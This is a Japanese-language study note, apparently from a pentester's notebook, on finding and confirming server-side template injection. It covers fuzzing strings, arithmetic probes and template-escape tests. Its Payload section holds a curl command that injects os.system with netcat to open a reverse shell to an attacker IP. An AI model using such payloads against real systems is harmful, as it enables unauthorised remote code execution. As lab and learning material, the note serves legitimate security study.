## ## SSTIの理解
 - SSTIは、SSTIを見つけようとしないと見過ごされやすい脆弱性である。

### ### SSTIの見つけ方
 - 特殊文字の列挙(テンプレートファジング)をするのが一般的。
```sh
${{<%[%'"}}%\
```
->注意:SSTIは2つの異なるコンテキストで発生し、どれぞれ独自の検出方法が必要である。

- SSTIの有無の判断基準
	- **プレーンテキストのコンテキストの場合**
		- XSSと同じ方法で見つけることが出来るが、この場合`{{7*7}}`などの演算を入力することにより、戻り値が49となればSSTIがあるという理解でいいだろう。
			※数字演算の場合、使用するテンプレートエンジンによって正しい書式が異なるので注意が必要。
	- **コードコンテキスト**
		- **Step1:XSSサイトでないことの確認が必要**
			```Example
			URL: http://site.com/?greeting=data.username<tag>
			目的: 直接的なXSS脆弱性がないことを確認
			期待結果: <tag>がエスケープされるか、エラーになる
			```
		- **Step2:テンプレート構文からの脱出。**
			```Example
			URL: http://site.com/?greeting=data.username}}<tag>
			目的: テンプレート式から抜け出してHTMLを挿入
			期待結果: もしSSTIがあれば「Hello Carlos<tag>」と表示される
			```

--- 
![[Pasted image 20250524180648.png]]
- 上記のような{}が出力されているときは、SSTIを疑ってよい


## ## Payload
```
curl -i http://192.168.237.117:50000/verify -X POST --data 'code=5*5'
curl -i http://192.168.243.117:50000/verify -X POST --data 'code=os.system("nc 192.168.45.154 18000 -e /bin/bash")'
```
※参考サイト
[https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys);

---
## ## Enumeration
### ### wordbruteforce
```sh
ffuf 
```

